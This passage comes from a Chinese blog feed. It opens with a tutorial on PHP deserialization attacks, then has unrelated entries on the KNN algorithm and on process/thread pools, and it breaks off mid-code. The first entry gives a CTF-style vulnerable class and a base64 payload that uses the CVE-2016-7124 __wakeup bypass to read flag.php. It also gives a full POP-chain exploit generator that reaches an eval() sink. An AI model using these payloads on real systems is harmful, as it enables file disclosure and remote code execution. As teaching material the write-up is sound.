级别的致命错误。</span><br></pre></td></tr></table></figure><p>简单的说就是 把对象用字符串表示，就自动调用这个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Caiji</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ID, $sex, $age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ID = $ID;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$me = <span class="keyword">new</span> Caiji(<span class="string">'zhaibaba'</span>, <span class="number">20</span>, <span class="string">'male'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'__toString:'</span>. <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> $me.<span class="string">'&lt;br&gt;'</span>;</span><br></pre></td></tr></table></figure><p>结果<br><img src="https://img-blog.csdnimg.cn/20200103141055940.png" alt="在这里插入图片描述"></p><h1 id="反序列化对象注入"><a href="#反序列化对象注入" class="headerlink" title="反序列化对象注入"></a>反序列化对象注入</h1><h2 id="绕过-wakeup-方法"><a href="#绕过-wakeup-方法" class="headerlink" title="绕过__wakeup()方法"></a>绕过__wakeup()方法</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span><br><span class="line">  <span class="keyword">protected</span> $file=<span class="string">'index.php'</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">"\\"</span>)===<span class="keyword">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">'/'</span>)===<span class="keyword">false</span>)</span><br><span class="line">        show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span> -&gt;file);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Wrong filename.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span> ;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span> <span class="comment">#&lt;!--key in flag.php--&gt;</span></span><br></pre></td></tr></table></figure><p>分析一下源码，<code>__destruct方法中show_source(dirname (__FILE__).&#39;/&#39;.$this \-&gt;file);</code>会读取file文件内容，我们需要利用这里来读flag.php，思路大概就是构造序列化对象然后base64编码传入，经过unserialize将file设为flag.php，<code>但是__wakeup会在unserialize之前执行，所以要绕过这一点。</code></p><p><strong>这里就要用到CVE-2016-7124漏洞，当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong></p><p>构造序列化对象：O:5:“SoFun”:<strong>1</strong>:{S:7:”\00*\00file”;s:8:“flag.php”;}<br>绕过__wakeup：O:5:“SoFun”:<strong>2</strong>:{S:7:”\00*\00file”;s:8:“flag.php”;}</p><p>注意：因为file是protect属性，所以需要加上\00*\00。再base64编码。<br>payload：Tzo1OiJTb0Z1biI6Mjp7Uzo3OiJcMDAqXDAwZmlsZSI7czo4OiJmbGFnLnBocCI7fQ==</p><h1 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h1><h2 id="POP：面向属性编程"><a href="#POP：面向属性编程" class="headerlink" title="POP：面向属性编程"></a>POP：面向属性编程</h2><p>面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。<br>二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：进行反序列化的数据能够被用户输入所控制。</p><h2 id="POP链利用"><a href="#POP链利用" class="headerlink" title="POP链利用"></a>POP链利用</h2><p>一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p><h2 id="训练"><a href="#训练" class="headerlink" title="训练"></a>训练</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2,$arr)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $s1 = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        $s1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"字符串拼接"</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str1;</span><br><span class="line">    <span class="keyword">public</span> $str2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $zhaibaba;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;zhaibaba);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">'string'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到需要执行GetFlag类中的get_flag()函数，这是一个类的普通方法。要让这个方法执行，需要构造一个POP链。</p><ol><li>string1中的__tostring存在$this-&gt;str1-&gt;get_flag()，分析一下要自动调用__tostring()需要把类string1当成字符串来使用，因为调用的是参数str1的方法，所以需要把str1赋值为类GetFlag的对象。</li><li>发现类func中存在__invoke方法执行了字符串拼接，需要把func当成函数使用自动调用__invoke然后把 m o d 1 赋 值 为 s t r i n g 1 的 对 象 与 mod1赋值为string1的对象与 mod1赋值为string1的对象与mod2拼接。</li><li>在funct中找到了函数调用，需要把mod1赋值为func类的对象，又因为函数调用在__call方法中，且参数为$test2,即无法调用test2方法时自动调用 __call方法；</li><li>在Call中的test1方法中存在 t h i s − &gt; m o d 1 − &gt; t e s t 2 ( ) ; ， 需 要 把 this-&gt;mod1-&gt;test2();，需要把 this−&gt;mod1−&gt;test2();，需要把mod1赋值为funct的对象，让__call自动调用。</li><li>查找test1方法的调用点，在start_gg中发现 t h i s − &gt; m o d 1 − &gt; t e s t 1 ( ) ; ， 把 this-&gt;mod1-&gt;test1();，把 this−&gt;mod1−&gt;test1();，把mod1赋值为start_gg类的对象，等待__destruct()自动调用。</li></ol><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call();<span class="comment">//把$mod1赋值为Call类对象</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> funct();<span class="comment">//把 $mod1赋值为funct类对象</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1= <span class="keyword">new</span> func();<span class="comment">//把 $mod1赋值为func类对象</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2,$arr)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $s1 = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        $s1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1= <span class="keyword">new</span> string1();<span class="comment">//把 $mod1赋值为string1类对象</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"字符串拼接"</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str1;</span><br><span class="line">    <span class="keyword">public</span> $zhaibaba;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1= <span class="keyword">new</span> GetFlag();<span class="comment">//把 $str1赋值为GetFlag类对</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;zhaibaba = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $zhaibaba;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$payload = <span class="keyword">new</span> start_gg();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($payload));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>总结一下PHP反序列化的挖掘思路，首先进行反序列化的数据点是用户可控的，然后反序列化类中需要有魔术方法，魔术方法中存在敏感操作，或者魔术方法中无敏感操作，但是其对象调用了其他类中的同名函数，可以通过构造POP链利用。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB 漏洞复现和分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KNN算法</title>
      <link href="/2020/01/02/KNN%E7%AE%97%E6%B3%95/"/>
      <url>/2020/01/02/KNN%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>1、KNN算法概述</p><p>kNN算法的核心思想是如果一个样本在特征空间中的k个最相邻的样本中的大多数属于某一个类别，则该样本也属于这个类别，并具有这个类别上样本的特性。该方法在确定分类决策上只依据最邻近的一个或者几个样本的类别来决定待分样本所属的类别。</p><p>2、KNN算法介绍</p><p>最简单最初级的分类器是将全部的训练数据所对应的类别都记录下来，当测试对象的属性和某个训练对象的属性完全匹配时，便可以对其进行分类。但是怎么可能所有测试对象都会找到与之完全匹配的训练对象呢，其次就是存在一个测试对象同时与多个训练对象匹配，导致一个训练对象被分到了多个类的问题，基于这些问题呢，就产生了KNN。</p><p>KNN是通过测量不同特征值之间的距离进行分类。它的的思路是：如果一个样本在特征空间中的k个最相似(即特征空间中最邻近)的样本中的大多数属于某一个类别，则该样本也属于这个类别。K通常是不大于20的整数。KNN算法中，所选择的邻居都是已经正确分类的对象。该方法在定类决策上只依据最邻近的一个或者几个样本的类别来决定待分样本所属的类别。</p><p><img src="https://img-blog.csdnimg.cn/20200102145718237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200102145844225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 人工智能机器学习与安全研究部 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>进程池，线程池使用</title>
      <link href="/2019/12/31/%E8%BF%9B%E7%A8%8B%E6%B1%A0%EF%BC%8C%E7%BA%BF%E7%A8%8B%E6%B1%A0%E4%BD%BF%E7%94%A8/"/>
      <url>/2019/12/31/%E8%BF%9B%E7%A8%8B%E6%B1%A0%EF%BC%8C%E7%BA%BF%E7%A8%8B%E6%B1%A0%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="进程的概念"><a href="#进程的概念" class="headerlink" title="进程的概念"></a><strong>进程的概念</strong></h2><p>第一，进程是一个实体。每一个进程都有它自己的地址空间，一般情况下，包括文本区域（text region）、数据区域（data region）和堆栈（stack region）。文本区域存储处理器执行的代码；数据区域存储变量和进程执行期间使用的动态分配的内存；堆栈区域存储着活动过程调用的指令和本地变量。<br>第二，进程是一个“执行中的程序”。程序是一个没有生命的实体，只有处理器赋予程序生命时（操作系统执行之），它才能成为一个活动的实体，我们称其为进程。[3]<br>进程是操作系统中最基本、重要的概念。是多道程序系统出现后，为了刻画系统内部出现的动态情况，描述系统内部各道程序的活动规律引进的一个概念,所有多道程序设计操作系统都建立在进程的基础上。</p><h2 id="引入进程原因"><a href="#引入进程原因" class="headerlink" title="引入进程原因"></a>引入进程原因</h2><ol><li>为了提高资源利用率和系统处理能力，现阶段计算机系统都是多道程序系统，即多道程序并发执行。</li><li>优化系统资源，方便计算机调度，避免系统运算紊乱。</li></ol><h2 id="进程的并行与并发"><a href="#进程的并行与并发" class="headerlink" title="进程的并行与并发"></a>进程的并行与并发</h2><p><strong>并行</strong>：并行是指两者同时执行，比如赛跑，两个人都在不停的往前跑；（资源够用，比如三个线程，四核CPU）</p><p><strong>并发</strong>：并行是指资源有限的情况下，两者交替轮流使用资源，比如一段路（单核CPU资源）同时只能过一个人，A走一段后，让给B，B用完继续给A，交替使用，目的是提高效率。</p><p>并行简图</p><p><img src="https://img-blog.csdnimg.cn/20191231104624807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>并发（线程）<br><img src="https://img-blog.csdnimg.cn/20191231104643694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="二、进程线程"><a href="#二、进程线程" class="headerlink" title="二、进程线程"></a>二、进程线程</h2><p>1、进程<br>程序仅仅只是一堆代码而已，而进程指的是程序的运行过程。需要强调的是：同一个程序执行两次，那也是两个进程。<br>进程：资源管理单位（容器）。<br>线程：最小执行单位，管理线程的是进程。</p><p>进程就是一个程序在一个数据集上的一次动态执行过程。进程一般由程序、数据集、进程控制块三部分组成。我们编写的程序用来描述进程要完成哪些功能以及如何完成；数据集则是程序在执行过程中所需要使用的资源；进程控制块用来记录进程的外部特征，描述进程的执行变化过程，系统可以利用它来控制和管理进程，它是系统感知进程存在的唯一标志。</p><p>2、线程<br>线程的出现是为了降低上下文切换的消耗，提高系统的并发性，并突破一个进程只能干一样事的缺陷，使到进程内并发成为可能。<br>线程也叫轻量级进程，它是一个基本的CPU执行单元，也是程序执行过程中的最小单元，由线程ID、程序计数器、寄存器集合和堆栈共同组成。线程的引入减小了程序并发执行时的开销，提高了操作系统的并发性能。线程没有自己的系统资源。</p><p>3、线程与进程关系<br>在传统操作系统中，每个进程有一个地址空间，而且默认就有一个控制线程。<br>多线程（即多个控制线程）的概念是，在一个进程中存在多个控制线程，控制该进程的地址空间。<br>进程只是用来把资源集中到一起（进程只是一个资源单位，或者说资源集合），而线程才是cpu上的执行单位。</p><p>进程和线程的关系：<br>(1)一个线程只能属于一个进程，而一个进程可以有多个线程，但至少有一个线程。<br>(2)资源分配给进程，同一进程的所有线程共享该进程的所有资源。<br>(3)CPU分给线程，即真正在CPU上运行的是线程。</p><p><strong>一、为什么要引入线程池</strong><br>Python中已经有了threading模块，为什么还需要线程池呢 ？<br>当写爬虫时，需要控制同时爬取的线程数，如果创建了20个线程，而同时只允许3个线程在运行，但是20个线程都需要创建和销毁，线程的创建是需要消耗系统资源的，有没有更好的方案呢？<br>其实只需要三个线程就行了，每个线程各分配一个任务，剩下的任务排队等待，当某个线程完成了任务的时候，排队任务就可以安排给这个线程继续执行。</p><h2 id="线程池使用方法"><a href="#线程池使用方法" class="headerlink" title="线程池使用方法"></a>线程池使用方法</h2><p>pip install threadpool</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pool = ThreadPool(poolsize)  </span><br><span class="line">requests = makeRequests(some_callable, list_of_args, callback)  </span><br><span class="line">[pool.putRequest(req) <span class="keyword">for</span> req in requests]  </span><br><span class="line">pool.wait()</span><br></pre></td></tr></table></figure><p>第一行定义了一个线程池，表示最多可以创建poolsize这么多线程；</p><p>第二行是调用makeRequests创建了要开启多线程的函数，以及函数相关参数和回调函数，其中回调函数可以不写，default是无，也就是说makeRequests只需要2个参数就可以运行；</p><p>第三行用法比较奇怪，是将所有要运行多线程的请求扔进线程池，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[pool.putRequest(req) <span class="keyword">for</span> req in requests]等同于</span><br><span class="line"></span><br><span class="line">　　<span class="keyword">for</span> req in requests:  </span><br><span class="line"></span><br><span class="line">　　　　 pool.putRequest(req)</span><br></pre></td></tr></table></figure><p>第四行是等待所有的线程完成工作后退出。</p><ul><li>我的测试样例是 线程池</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 